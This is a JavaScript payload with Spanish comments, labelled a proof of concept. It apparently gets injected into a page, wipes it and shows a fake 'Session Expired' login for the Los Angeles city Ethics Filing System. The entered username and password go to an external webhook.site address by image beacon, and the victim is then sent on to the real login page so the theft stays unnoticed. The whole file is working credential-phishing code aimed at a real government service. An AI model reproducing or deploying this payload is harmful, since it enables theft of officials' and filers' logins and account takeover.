(function() {
    // 1. Detener inmediatamente el procesamiento del resto de la página
    window.stop();

    // 2. Limpieza agresiva del DOM y eliminación de cualquier texto residual
    if (document.documentElement) {
        document.documentElement.innerHTML = '<head><title>System Message</title></head><body></body>';
    }

    // 3. Estilos críticos para ocultar cualquier residuo y centrar el login
    const style = document.createElement('style');
    style.innerHTML = `
        html, body { 
            margin: 0 !important; 
            padding: 0 !important; 
            height: 100% !important; 
            width: 100% !important;
            overflow: hidden !important; 
            background: #f0f2f5 !important;
        }
        #poc-wrapper {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; justify-content: center; align-items: center;
            z-index: 2147483647;
        }
    `;
    document.head.appendChild(style);

    // 4. Construcción del Login
    const wrapper = document.createElement('div');
    wrapper.id = 'poc-wrapper';
    wrapper.innerHTML = `
        <div style="width: 360px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; border-top: 5px solid #0056b3; font-family: sans-serif;">
            <img src="https://www.lacity.org/themes/custom/lacity/logo.png" 
                 onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Seal_of_Los_Angeles.svg/200px-Seal_of_Los_Angeles.svg.png'"
                 style="width: 180px; margin-bottom: 20px;">
            
            <h2 style="margin: 0 0 10px; color: #333; font-size: 20px;">Session Expired</h2>
            <p style="color: #666; font-size: 14px; margin-bottom: 25px;">Please re-authenticate to continue your session in the <strong>Ethics Filing System</strong>.</p>
            
            <div style="text-align: left;">
                <input id="u" type="text" placeholder="Username" style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;">
                <input id="p" type="password" placeholder="Password" style="width: 100%; padding: 12px; margin-bottom: 25px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;">
            </div>
            
            <button id="go" style="width: 100%; padding: 12px; background: #0056b3; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 16px;">Sign In</button>
        </div>
    `;

    document.body.appendChild(wrapper);

    // 5. Exfiltración vía Image Beacon (Inmune a CORS)
    document.getElementById('go').onclick = function() {
        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;
        
        if(!user || !pass) return;

        this.innerHTML = "Connecting...";
        this.disabled = true;

        // Enviamos los datos al Webhook
        const target = "https://webhook.site/4c7629c5-d711-46a7-92ad-83309267bd91";
        const exfil = new Image();
        exfil.src = `${target}?user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}&cache=${Math.random()}`;

        // Redirección para cerrar el ciclo de la PoC
        setTimeout(() => {
            window.location.replace("https://ethics.lacity.gov/efs/index.cfm?fuseaction=login");
        }, 800);
    };
})();
